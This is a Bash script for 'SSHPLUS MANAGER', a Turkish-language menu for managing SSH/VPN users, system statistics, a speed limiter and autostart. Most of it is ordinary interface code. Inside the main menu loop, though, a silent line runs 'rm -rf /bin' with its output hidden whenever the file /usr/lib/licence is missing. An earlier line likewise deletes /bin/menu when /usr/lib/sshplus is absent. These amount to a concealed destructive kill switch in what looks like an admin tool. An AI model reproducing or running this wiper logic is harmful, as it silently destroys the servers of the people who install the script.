#!/bin/bash
fun_bar () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -e /usr/lib/sshplus ]] && rm -rf /bin/menu > /dev/null 2>&1
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "\033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "\033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}
IP=$(cat /etc/IP)
x="ok"
menu ()
{
function autoexec () {
   if grep "menu;" /etc/profile > /dev/null; then
      clear
      echo -e "\033[1;32mOTOMATİK BAŞLATMA DEVRE DIŞI BIRAKILIYOR\033[0m"
      offautmenu () {
         sed -i '/menu;/d' /etc/profile
      }
      echo ""
      fun_bar 'offautmenu'
      echo ""
      echo -e "\033[1;31mOTOMATİK BAŞLATMA DEVRE DIŞI!\033[0m"
      sleep 1.5s
      menu
   else
      clear
      echo -e "\033[1;32mOTOMATİK BAŞLATMA ETKİNLEŞTİRİLİYOR\033[0m"
      autmenu () {
         grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
         echo "menu;" >> /etc/profile
      }
      echo ""
      fun_bar 'autmenu'
      echo ""
      echo -e "\033[1;32mOTOMATİK BAŞLATMA ETKİNLEŞTİRİLDİ!\033[0m"
      sleep 1.5s
      menu
   fi

}

#limiter
function limit1 () {
   clear
   echo -e "\n\033[1;32mHIZ SINIRLANDIRICI BAŞLATILIYOR... \033[0m"
   echo ""
   fun_bar 'screen -dmS limiter limiter' 'sleep 3'
   [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
       echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   } || {
       sed -i '/limiter/d' /etc/autostart
	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   }
   echo -e "\n\033[1;32m  HIZ SINIRLANDIRICI ETKİN!\033[0m"
   sleep 3
   menu
}
function limit2 () {
   clear
   echo -e "\033[1;32mHIZ SINIRLANDIRICI DURDURULUYOR... \033[0m"
   echo ""
   fun_stplimiter () {
      sleep 1
      screen -r -S "limiter" -X quit
      screen -wipe 1>/dev/null 2>/dev/null
      [[ $(grep -wc "limiter" /etc/autostart) != '0' ]] && {
          sed -i '/limiter/d' /etc/autostart
      }
      sleep 1
   }
   fun_bar 'fun_stplimiter' 'sleep 3'
   echo -e "\n\033[1;31m HIZ SINIRLANDIRICI DURDURULDU!\033[0m"
   sleep 3
   menu
}
function limit_ssh () {
[[ $(ps x | grep "limiter"|grep -v grep |wc -l) = '0' ]] && limit1 || limit2
}

while true $x != "ok"
do
[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/SSHPlus/Exp)" != "" ]] && _expuser=$(cat /etc/SSHPlus/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
_term_cols=$(tput cols 2>/dev/null)
[[ "$_term_cols" =~ ^[0-9]+$ ]] || _term_cols=56
(( _term_cols < 42 )) && _term_cols=42
(( _term_cols > 108 )) && _term_cols=108
_frame_inner=$((_term_cols - 2))
_frame_fill=$(printf '%*s' "$_frame_inner" '')
_frame_fill=${_frame_fill// /─}
_draw_frame_top () {
   printf '\033[38;5;39m╭%s╮\033[0m\n' "$_frame_fill"
}
_draw_frame_separator () {
   printf '\033[38;5;39m├%s┤\033[0m\n' "$_frame_fill"
}
_draw_frame_bottom () {
   printf '\033[38;5;39m╰%s╯\033[0m\n' "$_frame_fill"
}
_draw_rule () {
   printf '\033[38;5;39m%s\033[0m\n' "${_frame_fill//─/━}"
}
_draw_section_heading () {
   local _text="$1" _prefix='─ ' _fill _used
   _used=$((${#_prefix} + ${#_text} + 1))
   _fill=$((_frame_inner - _used))
   (( _fill < 1 )) && _fill=1
   _fill=$(printf '%*s' "$_fill" '')
   _fill=${_fill// /─}
   printf '\033[38;5;45m%s\033[1;38;5;45m%s\033[38;5;45m %s\033[0m\n' "$_prefix" "$_text" "$_fill"
}
_draw_banner () {
   local _text="$1" _room _left _right
   _room=$((_frame_inner - ${#_text} - 2))
   (( _room < 0 )) && _room=0
   _left=$((_room / 2))
   _right=$((_room - _left))
   printf '\033[38;5;45m╭%s╮\033[0m\n' "${_frame_fill//─/━}"
   printf '\033[38;5;45m│%*s \033[1;38;5;45m%s\033[38;5;45m %*s│\033[0m\n' "$_left" '' "$_text" "$_right" ''
   printf '\033[38;5;45m╰%s╯\033[0m\n' "${_frame_fill//─/━}"
}
_draw_full_stat_card () {
   local _heading="$1" _label1="$2" _value1="$3" _label2="$4" _value2="$5"
   local _pad _used
   _draw_frame_top
   _pad=$((_frame_inner - ${#_heading}))
   printf '\033[38;5;39m│\033[0m%*s\033[38;5;43m%s\033[0m%*s\033[38;5;39m│\033[0m\n' "$((_pad / 2))" '' "$_heading" "$((_pad - _pad / 2))" ''
   _draw_frame_separator
   _used=$((1 + ${#_label1} + 1 + ${#_value1}))
   _pad=$((_frame_inner - _used))
   (( _pad < 0 )) && _pad=0
   printf '\033[38;5;39m│\033[0m \033[38;5;203m%s\033[0m \033[1;37m%s\033[0m%*s\033[38;5;39m│\033[0m\n' "$_label1" "$_value1" "$_pad" ''
   _used=$((1 + ${#_label2} + 1 + ${#_value2}))
   _pad=$((_frame_inner - _used))
   (( _pad < 0 )) && _pad=0
   printf '\033[38;5;39m│\033[0m \033[38;5;203m%s\033[0m \033[1;37m%s\033[0m%*s\033[38;5;39m│\033[0m\n' "$_label2" "$_value2" "$_pad" ''
   _draw_frame_bottom
}
_draw_three_card_border () {
   local _cell_fill _i
   _cell_fill=$(printf '%*s' "$((_card_width - 2))" '')
   _cell_fill=${_cell_fill// /─}
   for _i in 1 2 3; do
      printf '\033[38;5;39m╭%s╮\033[0m' "$_cell_fill"
      [[ $_i -lt 3 ]] && printf '  '
   done
   printf '\n'
}
_draw_three_card_bottom () {
   local _cell_fill _i
   _cell_fill=$(printf '%*s' "$((_card_width - 2))" '')
   _cell_fill=${_cell_fill// /─}
   for _i in 1 2 3; do
      printf '\033[38;5;39m╰%s╯\033[0m' "$_cell_fill"
      [[ $_i -lt 3 ]] && printf '  '
   done
   printf '\n'
}
_draw_three_card_separator () {
   local _cell_fill _i
   _cell_fill=$(printf '%*s' "$((_card_width - 2))" '')
   _cell_fill=${_cell_fill// /─}
   for _i in 1 2 3; do
      printf '\033[38;5;39m├%s┤\033[0m' "$_cell_fill"
      [[ $_i -lt 3 ]] && printf '  '
   done
   printf '\n'
}
_draw_three_card_headings () {
   local _i _heading _pad
   local -a _headings=("■ SİSTEM" "≡ RAM" "■ İŞLEMCİ")
   for _i in 0 1 2; do
      _heading="${_headings[$_i]}"
      _pad=$((_card_width - 2 - ${#_heading}))
      printf '\033[38;5;39m│\033[0m%*s\033[1;38;5;43m%s\033[0m%*s\033[38;5;39m│\033[0m' "$((_pad / 2))" '' "$_heading" "$((_pad - _pad / 2))" ''
      [[ $_i -lt 2 ]] && printf '  '
   done
   printf '\n'
}
_draw_three_card_row () {
   local _i _label _value _used _pad
   local -a _labels=("$1" "$3" "$5") _values=("$2" "$4" "$6")
   for _i in 0 1 2; do
      _label="${_labels[$_i]}"
      _value="${_values[$_i]}"
      _used=$((1 + ${#_label} + 1 + ${#_value}))
      _pad=$((_card_width - 2 - _used))
      (( _pad < 0 )) && _pad=0
      printf '\033[38;5;39m│\033[0m \033[38;5;203m%s\033[0m \033[1;37m%s\033[0m%*s\033[38;5;39m│\033[0m' "$_label" "$_value" "$_pad" ''
      [[ $_i -lt 2 ]] && printf '  '
   done
   printf '\n'
}
_draw_menu_row () {
   local _number="$1" _label="$2" _label_color="$3" _suffix="${4:-}" _suffix_plain _plain _pad
   _suffix_plain=$(printf '%s' "$_suffix" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g')
   _plain="  [$_number]  •  $_label$_suffix_plain"
   _pad=$((_frame_inner - ${#_plain}))
   (( _pad < 0 )) && _pad=0
   printf '\033[38;5;39m│\033[0m  \033[38;5;203m[\033[0m\033[38;5;45m%s\033[0m\033[38;5;203m]\033[0m  \033[1;37m•\033[0m  \033[%sm%s\033[0m%b\033[0m%*s\033[38;5;39m│\033[0m\n' "$_number" "$_label_color" "$_label" "$_suffix" "$_pad" ''
}
_draw_update_row () {
   local _mark_plain _plain _pad
   _mark_plain=$(printf '%b' "$var01" | sed -E $'s/\x1B\\[[0-9;]*[[:alpha:]]//g')
   _plain="  [04]  $_mark_plain  [!] BETİĞİ GÜNCELLE"
   _pad=$((_frame_inner - ${#_plain}))
   (( _pad < 0 )) && _pad=0
   printf '\033[38;5;39m│\033[0m  \033[38;5;203m[\033[0m\033[38;5;45m04\033[0m\033[38;5;203m]\033[0m  %b  \033[38;5;221m[!]\033[0m \033[38;5;43mBETİĞİ GÜNCELLE\033[0m%*s\033[38;5;39m│\033[0m\n' "$var01" "$_pad" ''
}
_draw_user_cell () {
   local _icon="$1" _label="$2" _value="$3" _color="$4" _width="$5" _used _pad
   _used=$((2 + ${#_icon} + 1 + ${#_label} + 1 + ${#_value}))
   _pad=$((_width - _used))
   (( _pad < 0 )) && _pad=0
   printf '  \033[%sm%s %s\033[0m \033[1;37m%s\033[0m%*s' "$_color" "$_icon" "$_label" "$_value" "$_pad" ''
}
_draw_user_stats () {
   local _online="${_onlin// /}" _expired="${_userexp// /}" _visible _pad _left _right _cell1 _cell2 _cell3
   local _i _label _label_pad _value _label_width=15
   local -a _labels=('♟ Çevrimiçi:' '◷ Süresi dolan:' '▂▅▇ Toplam:')
   local -a _values=("$_online" "$_expired" "$_tuser")
   local -a _colors=('38;5;43' '38;5;203' '38;5;221')
   _draw_frame_top
   if (( _term_cols >= 94 )); then
      _cell1=$(((_frame_inner - 2) / 3))
      _cell2=$_cell1
      _cell3=$((_frame_inner - 2 - _cell1 - _cell2))
      printf '\033[38;5;39m│\033[0m'
      _draw_user_cell '♟' 'Çevrimiçi:' "$_online" '38;5;43' "$_cell1"
      printf '\033[38;5;39m│\033[0m'
      _draw_user_cell '◷' 'Süresi dolan:' "$_expired" '38;5;203' "$_cell2"
      printf '\033[38;5;39m│\033[0m'
      _draw_user_cell '▂▅▇' 'Toplam:' "$_tuser" '38;5;221' "$_cell3"
      printf '\033[38;5;39m│\033[0m\n'
   else
      for _i in 0 1 2; do
         _label="${_labels[$_i]}"
         _value="${_values[$_i]}"
         _label_pad=$((_label_width - ${#_label}))
         _pad=$((_frame_inner - 2 - _label_width - 1 - ${#_value}))
         (( _label_pad < 0 )) && _label_pad=0
         (( _pad < 0 )) && _pad=0
         printf '\033[38;5;39m│\033[0m  \033[%sm%s\033[0m%*s \033[1;37m%s\033[0m%*s\033[38;5;39m│\033[0m\n' "${_colors[$_i]}" "$_label" "$_label_pad" '' "$_value" "$_pad" ''
      done
   fi
   _draw_frame_bottom
}
_title='SSHPLUS MANAGER'
_draw_banner "$_title"
printf '\n'
_draw_section_heading 'SİSTEM DURUMU'
printf '\n'
if (( _term_cols >= 94 )); then
   _card_width=$(((_term_cols - 4) / 3))
   _draw_three_card_border
   _draw_three_card_headings
   _draw_three_card_separator
   _draw_three_card_row 'İşletim sistemi:' "$system" 'Toplam:' "${_ram// /}" 'Çekirdek:' "$_core"
   _draw_three_card_row 'Saat:' "$_hora" 'RAM kullanımı:' "${_usor// /}" 'CPU kullanımı:' "${_usop// /}"
   _draw_three_card_bottom
else
   _draw_full_stat_card '■ SİSTEM' 'İşletim sistemi:' "$system" 'Saat:' "$_hora"
   _draw_full_stat_card '≡ RAM' 'Toplam:' "${_ram// /}" 'RAM kullanımı:' "${_usor// /}"
   _draw_full_stat_card '■ İŞLEMCİ' 'Çekirdek:' "$_core" 'CPU kullanımı:' "${_usop// /}"
fi
printf '\n'
_draw_section_heading 'KULLANICI DURUMU'
printf '\n'
_draw_user_stats
if [[ ! -e /tmp/att ]]; then
    var01='\033[1;37m•'
else
    printf '\n  \033[38;5;221m[!] YENİ BİR GÜNCELLEME VAR\033[0m\n'
    var01='\033[1;32m!'
fi
printf '\n'
_draw_section_heading 'ANA MENÜ'
printf '\n'
_draw_frame_top
_draw_frame_blank () {
   printf '\033[38;5;39m│\033[0m%*s\033[38;5;39m│\033[0m\n' "$_frame_inner" ''
}
_draw_frame_blank
_draw_menu_row '01' 'KULLANICILARI YÖNET' '38;5;221'
_draw_menu_row '02' 'ARAÇLARI YÖNET' '38;5;221'
_draw_menu_row '03' 'SİSTEMİ YÖNET' '38;5;221'
_draw_update_row
_draw_menu_row '05' '[!] BETİĞİ KALDIR' '38;5;203'
_draw_menu_row '06' 'HIZ SINIRLANDIRICI' '38;5;221' "  $stsl"
_draw_menu_row '07' 'OTOMATİK BAŞLATMA' '38;5;221' "  $autm"
_draw_menu_row '08' 'BAĞLANTI MODU' '38;5;221'
_draw_menu_row '00' 'MENÜDEN ÇIK' '38;5;221' $'  \033[38;5;43m<<<\033[0m'
_draw_frame_blank
_draw_frame_bottom
_draw_rule
printf '\n\033[38;5;43mNE YAPMAK İSTİYORSUN\033[0m \033[38;5;203m?\033[0m\033[38;5;203m?\033[0m \033[1;37m:\033[0m '
read x

case "$x" in 
   1 | 01)
   clear
   usercodes
   ;;
   2 | 02)
   clear
   ferramentascodes
   ;;
   3 | 03)
   clear
   gestorcodes
   ;;
   4 | 04)
   attscript
   ;;
   5 | 05)
   clear
   delscript
   ;;
   6 | 06)
   limit_ssh
   ;;      
   7 | 07)
   autoexec
   ;;
   8 | 08)
   conexao
   exit
   ;;
   0 | 00)
   echo -e "\033[1;31mÇıkılıyor...\033[0m"
   sleep 2
   clear
   exit;
   ;;
   *)
   echo -e "\n\033[1;31mGeçersiz seçim!\033[0m"
   sleep 2
esac
done
}
menu
#fim
